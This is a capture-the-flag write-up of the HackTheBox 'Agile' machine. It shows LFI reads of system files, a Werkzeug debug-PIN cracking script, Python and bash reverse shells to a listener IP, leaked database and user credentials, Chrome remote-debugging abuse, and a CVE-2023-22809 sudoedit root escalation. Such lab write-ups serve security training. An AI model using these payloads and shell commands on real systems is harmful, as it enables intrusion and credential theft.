# Agile - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Agile.JPG](images/Agile.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services and find ports `22`, and `80`.

***User 1***: Discovered a Local File Inclusion (LFI) vulnerability on the Export API. Additionally, detected the presence of a debug console on the error page. By successfully cracking the Flask Werkzeug console PIN, gained access as the `www-data` user and established a reverse shell. Furthermore, uncovered database credentials and retrieved the password for the `corum` user.

***User 2***: Identified the presence of Chrome remote port debugging. Leveraged an SSH tunnel to access this port and encountered the SuperPassword page. Upon clicking on Vault, discovered the credentials associated with the `edwards` user.

***Root***: Executed `sudo -l` command and discovered that we have the privilege to run `sudoedit` as the `dev_admin` user. Carried out monitoring using `pspy64` and identified that the file `/app/venv/bin/activate` is executed by the `root` user. Noted that the `dev_admin` user has editing permissions for this file. Exploited the vulnerability `CVE-2023-22809` to modify the contents of the file `/app/venv/bin/activate`, thereby gaining a reverse shell with `root` privileges.

![pwn.JPG](images/pwn.JPG)


## Agile Solution

### User 1

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ nmap -sV -sC -oA nmap/Agile 10.10.11.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 22:11 IDT
Nmap scan report for 10.10.11.203
Host is up (0.074s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Observing port `80`, we see that the following web page is hosted:

![port80.JPG](images/port80.JPG)

Let's proceed with the registration:

![register.JPG](images/register.JPG)

After completing the registration process, we are redirected to the following page:

![vault.JPG](images/vault.JPG)

Now, let's add a new row and click on the `Export` button:

![add.JPG](images/add.JPG)

Upon clicking the `Export` button, a CSV file is generated, containing the following data:
```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ cat superpass_export.csv
Site,Username,Password
127.0.0.1,evyatar9,1776001fa0f30b9b4f8d
```

By intercepting the `Export` request, we can examine the details of the following request:
```http
GET /download?fn=evyatar9_export_aaeafefd2f.csv HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: remember_token=9|caf4dafe01024addb437c2de8d3329681ae12ae2988a40943d90aac775a034456ec509d893e1d3808aa90fa1c256c0d3b191588d402fa2d6bf92defc9813b86b; session=.eJwljk2KwzAMha9itC6DLDuOnFPMfihFjuQmkJmWOF2V3n1cunq8Hz7eEy51k7ZYg-nnCe7oAr_WmlwNTvC9mTRz2-3q1j933JzMcy_dsazN3fvmC86v86lDdmsLTMf-sO5WhQlwEEqIIyHX6C0QqUepXIOa0Ujck-qHGDn7krNPpJasFswiPlksgZWyRFX11IXzjKxI8c2zYdQyKBsieis-BOEYEQdOkQNSkNTvXx7N9s-bDK9_dFtEpw.ZGvG8Q.-iDXiwBeXdSNeRezoeyylIHTciY
Connection: close
```

This page is vulnerable to Local File Inclusion (LFI) attacks. By sending the following URL, `GET /download?fn=../etc/passwd`, we can retrieve the content of the file `/etc/passwd`:
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 22 May 2023 19:46:52 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 1744
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

After navigating through several pages, we encounter an error page displaying the following information:

![error.JPG](images/error.JPG)

At the bottom of the error page, we find information regarding the availability of the debug console option:

![errorbottom.JPG](images/errorbottom.JPG)

Upon clicking the button, we are presented with the console lock form shown below:

![consolelock.JPG](images/consolelock.JPG)

To retrieve the PIN code using the LFI vulnerability and the information provided in the article, we can follow the steps outlined in the article at https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/. The article provides a detailed guide on how to crack the Flask Werkzeug console PIN using the LFI vulnerability. By following the instructions provided, we should be able to obtain the PIN code successfully.

To determine the name of the user running the application, we can retrieve the environment variables from the `/proc/self/environ` file by making a GET request to GET `/download?fn=../proc/self/environ`. The response will contain the environment variables associated with the application process:
```HTTP
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 28 May 2023 18:33:52 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 260
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin HOME=/var/www LOGNAME=www-data USER=www-data INVOCATION_ID=a173dc8e5d684617a08aecf0a2820eb3 JOURNAL_STREAM=8:32146 SYSTEMD_EXEC_PID=1071 CONFIG_PATH=/app/config_prod.json
```

Based on the response obtained earlier, we can determine that the user running the application is `www-data`.

To retrieve the required private values, such as the `mac_address` in decimal format, `machine_id`, and possibly the `cgroup` value, we can access the contents of the `/proc/net/arp` file. The output of `/proc/net/arp` will provide the necessary information:
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 28 May 2023 18:56:35 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 156
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:7f:fa     *        eth0
```

The relevant information we are interested in is the device name `eth0`. Once we have identified the device name, we can examine the file `/sys/class/net/eth0/address` to retrieve the MAC address associated with it:
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 28 May 2023 18:58:02 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 18
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

00:50:56:b9:d0:d5
```

We can convert it to decimal using `Python` as follows:
```python
>>> print(0x005056b9d0d5)
345052401877
```

The value for the first `private_bits` is `365663971209`.

Next, we need to retrieve the value of `/etc/machine-id`:
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 28 May 2023 19:00:43 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 33
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

ed5b159560f54721827644bc9b220d00
```

The final value we require is `/proc/self/cgroup`:
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 28 May 2023 19:03:07 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 35
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

0::/system.slice/superpass.service
```

Of importance is that the value will contain forward slashes (`/`) as separators, and we are interested in extracting the last portion of the string that appears after the final slash. In this case, the desired value is `superpass.service`, resulting in the complete value of `ed5b159560f54721827644bc9b220d00superpass.service`.

Once we have gathered the necessary information, we can proceed to generate potential PIN values using the following Python script, as outlined in the article:
```python
import hashlib
import itertools
from itertools import chain

def crack_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.md5()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.sha1()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
    probably_public_bits = [
            username,
            modname,
            appname,
            flaskapp_path ]
    private_bits = [
            node_uuid,
            machine_id ]

    h = hasher
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)

if __name__ == '__main__':

    usernames = ['www-data']
    modnames = ['flask.app', 'werkzeug.debug']
    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']
    flaskpaths = ['/app/venv/lib/python3.10/site-packages/flask/app.py']
    #flaskpaths = ['/app/app/superpass/app.py']
    nodeuuids = ['345052401877']
    machineids = ['ed5b159560f54721827644bc9b220d00superpass.service']

    # Generate all possible combinations of values
    combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)

    # Iterate over the combinations and call the crack() function for each one
    for combo in combinations:
        username, modname, appname, flaskpath, nodeuuid, machineid = combo
        print('==========================================================================')
        crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
        print(f'{combo}')
        print('=========================================================================='
```

Run it:
```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ python3 pin.py 
==========================================================================
723-516-998
('www-data', 'flask.app', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052401877', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================
==========================================================================
145-687-777
('www-data', 'flask.app', 'DebuggedApplication', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052401877', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================
==========================================================================
445-677-577
('www-data', 'flask.app', 'Flask', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052401877', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================
==========================================================================
244-380-470
('www-data', 'werkzeug.debug', 'wsgi_app', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052401877', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================
==========================================================================
407-014-016
('www-data', 'werkzeug.debug', 'DebuggedApplication', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052401877', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================
==========================================================================
963-193-314
('www-data', 'werkzeug.debug', 'Flask', '/app/venv/lib/python3.10/site-packages/flask/app.py', '345052401877', 'ed5b159560f54721827644bc9b220d00superpass.service')
==========================================================================
```

After testing various PIN codes, we have successfully found a working PIN code, which is `723-516-998`.

Now that we have access to the console, we can proceed with our operations:

![consoleready.JPG](images/consoleready.JPG)

To establish a reverse shell, we can execute the following command in the console:
```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```


```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from superpass.htb [10.10.11.203] 53682
$ 
```

Through enumeration, we have discovered the following configuration file:
```console
$ pwd
pwd
/app
$ ls
ls
app  app-testing  config_prod.json  config_test.json  test_and_update.sh  venv
$ cat config_prod.json
cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

Let's establish a connection to the database using the provided credentials:
```console
$ mysql -u superpassuser -p -e "show databases;"
Enter password: dSA6l7q*yIVs$39Ml6ywvgK
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
$ mysql -u superpassuser -p -e "use superpass;show tables;"
mysql -u superpassuser -p -e "use superpass;show tables;"
Enter password: dSA6l7q*yIVs$39Ml6ywvgK

+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
$ $ mysql -u superpassuser -p -e "use superpass;select * from passwords;"
mysql -u superpassuser -p -e "use superpass;select * from passwords;"
Enter password: dSA6l7q*yIVs$39Ml6ywvgK

+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
```

In the `/home` directory, we found the following list of users:
```console
$ ls -ltr /home
ls -ltr /home
total 12
drwxr-x---  2 dev_admin dev_admin 4096 Feb  8 16:29 dev_admin
drwxr-x--- 10 corum     corum     4096 May 28 00:15 corum
drwxr-x---  6 edwards   edwards   4096 May 28 01:26 edwards
```

We will log in using SSH using the credentials of the user `corum` and the provided password `5db7caa1d13cc37c9fc2` of `agile` URL:
```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ ssh corum@superpass.htb 
The authenticity of host 'superpass.htb (10.10.11.203)' can't be established.
ECDSA key fingerprint is SHA256:1d/DkiEPb/QoZOLY+A6kshu7guo3ujbXS4B74jrYUM8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'superpass.htb,10.10.11.203' (ECDSA) to the list of known hosts.
corum@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Sat May 27 23:29:37 2023 from 10.10.14.14
corum@agile:~$ cat user.txt 
8775c9e4d715d4a6886fce987e4dedce
```

And we get the user flag `8775c9e4d715d4a6886fce987e4dedce`.

### User 2

After executing the `netstat -tulpan` command, the output obtained is as follows:
```console
corum@agile:/tmp$ netstat -tulpan
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34381         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.10.11.203:36152      8.8.8.8:53              SYN_SENT    -                   
tcp        0      0 127.0.0.1:45708         127.0.0.1:41829         ESTABLISHED -                   
tcp        1      0 127.0.0.1:5000          127.0.0.1:57736         CLOSE_WAIT  -                   
tcp        0      0 10.10.11.203:53682      10.10.14.4:4242         CLOSE_WAIT  -                   
tcp        0      0 127.0.0.1:48810         127.0.0.1:34381         ESTABLISHED -                   
tcp        0      0 127.0.0.1:41829         127.0.0.1:45724         ESTABLISHED -                   
tcp        0      0 127.0.0.1:34381         127.0.0.1:48810         ESTABLISHED -                   
tcp        1      0 127.0.0.1:5000          127.0.0.1:35792         CLOSE_WAIT  -                   
tcp      150      0 127.0.0.1:32960         127.0.0.1:3306          CLOSE_WAIT  -                   
tcp        0    376 10.10.11.203:22         10.10.14.4:48962        ESTABLISHED -                   
tcp        0      0 127.0.0.1:45724         127.0.0.1:41829         ESTABLISHED -                   
tcp        0      0 127.0.0.1:41829         127.0.0.1:45708         ESTABLISHED -                   
tcp        1      0 127.0.0.1:5000          127.0.0.1:55608         CLOSE_WAIT  -                   
tcp6       0      0 ::1:34381               :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.1:51121         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 10.10.11.203:35084      8.8.8.8:53              ESTABLISHED -                   
udp        0      0 10.10.11.203:40750      8.8.8.8:53              ESTABLISHED -        
```

We have identified the port `41829` as an interesting port. Let's search for it in the list of running processes:
```console
corum@agile:~$ ps faux | grep 41829
runner     98714  0.1  2.6 33986460 104396 ?     Sl   19:55   0:00                      \_ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.MOvjTc --window-size=1420,1080 data:,
runner     98778  0.3  3.1 1184735612 127260 ?   Sl   19:55   0:01                          |       \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=98721 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1685202695912331 --launch-time-ticks=101006682952 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,11587310296879672272,1769524132211705033,131072 --disable-features=PaintHolding
```

We have determined that port 41829 corresponds to the debugging port of Google Chrome.

To configure the remote debugger, we can refer to the instructions provided in the article at  https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/.

Create an SSH tunnel to this port, We can use the following command:
```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ ssh -L 41829:127.0.0.1:41829 corum@superpass.htb  -N
corum@superpass.htb's password: 
```

To begin, open Google Chrome and navigate to `chrome://inspect/#devices`.

Next, locate the `Discover network targets` section and click on the `Configure...` button situated on the right side. This action will prompt the opening of a modal window.

Within the modal window, enter `localhost:41829` and proceed by clicking the `Done` button to save the configuration:

![configure.JPG](images/configure.JPG)

After completing the previous steps, you should now observe the remote host appearing at the bottom of the `Remote Target` section:

![inspect.JPG](images/inspect.JPG)

Clicking on the `Inspect` button will open a new browser window, allowing us to browse the website:

![debug.JPG](images/debug.JPG)


By selecting `Vault` we obtain the credentials for the user named `edwards`, which are `d07867c6267dcb5df0af`:

![edwards.JPG](images/edwards.JPG)

Let's utilize the obtained password to establish an SSH connection:
```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ ssh edwards@superpass.htb 
edwards@superpass.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Sun May 28 01:00:13 2023 from 10.10.14.14
edwards@agile:~$ 
```

### Root

After executing the command `sudo -l`, we receive the following output:
```console
edwards@agile:~$ sudo -l
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

We have the privilege to utilize sudoedit as `dev_admin` to open two files.

Upon running [pspy64](https://github.com/DominicBreuker/pspy), we obtain the following output:
```console
edwards@agile:~$ ./pspy64
2023/05/28 23:33:05 CMD: UID=1002  PID=1326   | grep --color=auto activate 
2023/05/28 23:33:05 CMD: UID=1002  PID=1320   | vim /var/tmp/activate.XXfIlGzM /var/tmp/config_testXXXyfw94.json 
2023/05/28 23:33:11 CMD: UID=0     PID=1480   | /bin/bash -c source /app/venv/bin/activate
```

After inspecting the file permissions of `/app/venv/bin/activate`, we found the following:
```console
edwards@agile:/tmp$ ls -ltr /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 May 28 20:33 /app/venv/bin/activate
```

The file `/app/venv/bin/activate` has `dev_admin` as a writable group. If we can modify this file, we can escalate our privileges to `root`.

Since we are using `sudo version 1.9.9`, which is vulnerable to `CVE-2023-22809` (as described in the link: https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc), we can proceed with the following steps: 
```console
edwards@agile:/tmp$ export EDITOR="vim -- /app/venv/bin/activate"
```

Now, let's utilize `sudoedit` as the `dev_admin` user:
```console
edwards@agile:/tmp$ sudo -u dev_admin sudoedit /app/config_test.json
```

We proceed to modify the file `/app/venv/bin/activate`, let's add a reverse shell:
```bash
bash -i >& /dev/tcp/10.10.14.14/4242 0>&1
```

![sudoedit.JPG](images/sudoedit.JPG)


After a brief interval, a reverse shell is obtained as the `root` user:
```console
┌─[evyatar9@parrot]─[/hackthebox/Agile]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from superpass.htb [10.10.11.203] 54162
bash: cannot set terminal process group (116063): Inappropriate ioctl for device
bash: no job control in this shell
bash: connect: Connection refused
bash: /dev/tcp/10.10.14.14/4242: Connection refused
root@agile:~# cat root.txt
cat root.txt
7ee2aaa2280a9d7eb902215620074837
```

And we get the root flag `7ee2aaa2280a9d7eb902215620074837`.


PDF password
```console
$y$j9T$aVz0UjJ8lKXB0U/ishNnn.$xjtp7fGYHDgeqSVAgoF8scjYgJ.SG7HoSCsxL7/Pie.
```